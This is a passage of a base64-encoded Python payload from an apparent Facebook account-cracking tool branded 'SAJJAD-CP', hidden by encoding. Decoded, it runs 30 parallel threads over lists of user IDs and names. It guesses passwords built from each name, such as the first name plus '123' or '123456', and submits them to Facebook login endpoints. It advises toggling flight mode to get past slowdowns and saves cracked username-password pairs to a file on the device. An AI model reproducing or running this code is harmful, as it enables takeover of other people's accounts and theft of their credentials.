fdHRsW21vbnRoXQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1xyJXMgXDAzM1sxOzk0bVtTQUpKQUQtQ1BdICVzIHwgJXMgJyAlIChLLHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgd3J0ID0gJyVzfCVzJyAlICh1c2VyLHB3KQ0KICAgICAgICAgICAgICAgICAgICAgICAgY3AuYXBwZW5kKHdydCkNCiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQvU0FKSkFELUNQLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOg0KICAgICAgICAgICAgICAgICAgICAgICAgbW9udGggPSAnJw0KICAgICAgICAgICAgICAgICAgICAgICAgZGF5ICAgPSAnJw0KICAgICAgICAgICAgICAgICAgICAgICAgeWVhciAgPSAnJw0KICAgICAgICAgICAgICAgICAgICBleGNlcHQ6cGFzcw0KICAgICAgICAgICAgICAgICAgICBwcmludCgnXHIlcyBcMDMzWzE7OTRtW1NBSkpBRC1DUF0gJXMgfCAlcyAnICUgKEssdXNlcixwdykpDQogICAgICAgICAgICAgICAgICAgIHdydCA9ICclc3wlcycgJSAodXNlcixwdykNCiAgICAgICAgICAgICAgICAgICAgY3AuYXBwZW5kKHdydCkNCiAgICAgICAgICAgICAgICAgICAgb3BlbignL3NkY2FyZC9TQUpKQUQtQ1AudHh0JyAsICdhJykud3JpdGUoJyVzXG4nICUgd3J0KQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogDQogICAgICAgICAgICBsb29wKz0xDQogICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgIHNlbGYuX19tZXRvZGVfXyh1c2VyLCBwdywgY2hhY2hhamkpDQogICAgZGVmIF9fcGxlcl9fKHNlbGYpOg0KICAgICAgICBjaGkgPSAoJzInKQ0KICAgICAgICBpZiBjaGkgPT0gJyc6DQogICAgICAgICAgICBwcmludCgnXG5TZWxlY3QgQ29ycmVjdCBPbmUnKTtzZWxmLl9fcGxlcl9fKCkNCiAgICAgICAgZWxpZiBjaGkgaW4gKCcxJywgJzAxJyk6DQogICAgICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICAgICAgICAgIGxvZ28oKQ0KICAgICAgICAgICAgcHJpbnQoJycpDQogICAgICAgICAgICBwcmludCgnIFwwMzNbMTs0OTszOW0gVE9UQUwgSURaIDogJXMlcycgJShsZW4oc2VsZi5pZCksTykpDQogICAgICAgICAgICBwcmludCgnIFwwMzNbMTs5M20gVVNFIEZMSUdIVCBNT0RFIElGIFNQRUVEIEFSRSBTTE9XICcpDQogICAgICAgICAgICBwcmludCgnIFwwMzNbMTs5Mm0gSU4gVEhFIEJBQ0tHUk9VTkQgJykNCiAgICAgICAgICAgIHByaW50KCctLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJykNCiAgICAgICAgICAgIHByaW50KCcnKQ0KICAgICAgICAgICAgd2l0aCBLSU5HTkFTRUVSKG1heF93b3JrZXJzPTMwKSBhcyBraXJpbToNCiAgICAgICAgICAgICAgICBmb3IgdGhhbmttZSBpbiBzZWxmLmlkOiAjIFlvIE5kYWsgVGF1IEtvayBUYW55YSBTYWlhDQogICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgIHVpZCwgbmFtZSA9IHRoYW5rbWUuc3BsaXQoJ3wnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgeHogPSBuYW1lLnNwbGl0KCcgJykNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbih4eikgPT0gMyBvciBsZW4oeHopID09IDQgb3IgbGVuKHh6KSA9PSA1IG9yIGxlbih4eikgPT0gNjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbbmFtZSwgeHpbMF0rIjEyMyIsIHh6WzBdK3h6WzFdLCB4elswXSsiMTIzNDUiLHh6WzBdKyIxMjM0Iix4elswXSsiMTIzNDU2Il0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gW25hbWUsIHh6WzBdKyIxMjMiLCB4elswXSt4elsxXSwgeHpbMF0rIjEyMzQ1Iix4elswXSsiMTIzNCIseHpbMF0rIjEyMzQ1NiJdDQogICAgICAgICAgICAgICAgICAgICAgICBraXJpbS5zdWJtaXQoc2VsZi5fX21ldG9kZV9fLCB1aWQsIHB3eCwgIm1iYXNpYy5mYWNlYm9vay5jb20iKQ0KICAgICAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgICAgICBwYXNzDQogDQogICAgICAgICAgICBUSEVTQUpKQUQoT0ssY3ApDQogICAgICAgIGVsaWYgY2hpIGluICgnMicsICcwMicpOg0KIA0KICAgICAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgICAgICAgICBsb2dvKCkNCiAgICAgICAgICAgIHByaW50KCcnKQ0KICAgICAgICAgICAgcHJpbnQoIiBcMDMzWzE7OTdtIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIpO3RpbWUuc2xlZXAoMC4wMykNCiAgICAgICAgICAgIHByaW50KCcgXDAzM1sxOzk3bSBUT1RBTCBJRFogOiAlcyVzJyAlKGxlbihzZWxmLmlkKSxPKSkNCiAgICAgICAgICAgIHByaW50KCcgXDAzM1sxOzkxbSBVU0UgRkxJR0hUIE1PREUgSUYgU1BFRUQgQVJFIFNFTE9XJykNCiAgICAgICAgICAgIHByaW50KCcgXDAzM1sxOzkybSBDUkFDSyBIQVMgQkVFTiBTVEFSVEVEJykNCiAgICAgICAgICAgIHByaW50KCIgXDAzM1sxOzk3bSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iKTt0aW1lLnNsZWVwKDAuMDMpDQogICAgICAgICAgICBwcmludCgnJykNCiAgICAgICAgICAgIHdpdGggS0lOR05BU0VFUihtYXhfd29ya2Vycz0zMCkgYXMga2lyaW06DQogICAgICAgICAgICAgICAgZm9yIHRoYW5rbWUgaW4gc2VsZi5pZDogIyBDSEVDS19USEVfUE9XRVJfT0ZfWU9VUl9EQUQNCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgdWlkLCBuYW1lID0gdGhhbmttZS5zcGxpdCgnfCcpDQogICAgICAgICAgICAgICAgICAgICAgICB4eiA9IG5hbWUuc3BsaXQoJyAnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHh6KSA9PSAzIG9yIGxlbih4eikgPT0gNCBvciBsZW4oeHopID09IDUgb3IgbGVuKHh6KSA9PSA2Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFtuYW1lLCB4elswXSsiMTIzIiwgeHpbMF0reHpbMV0sIHh6WzBdKyIxMjM0NSIseHpbMF0rIjEyMzQiLHh6WzBdKyIxMjM0NTYiXQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbbmFtZSwgeHpbMF0rIjEyMyIsIHh6WzBdK3h6WzFdLCB4elswXSsiMTIzNDUiLHh6WzBdKyIxMjM0Iix4elswXSsiMTIzNDU2Il0NCiAgICAgICAgICAgICAgICAgICAgICAgIGtpcmltLnN1Ym1pdChzZWxmLl9fbWV0b2RlX18sIHVpZCwgcHd4LCAieC5mYWNlYm9vay5jb20iKQ0KICAgICAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgICAgICBwYXNzDQogDQogICAgICAgICAgICBUSEVTQUpKQUQoT0ssY3ApDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwcmludCgnXG4gU2VsZWN0IFZhbGlkIE9uZScpO3NlbGYuX19wbGVyX18oKQ0KIA0KIA0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCg0KICAgIHB5dGhvbl9qYXZhKCkNCiANCiA="))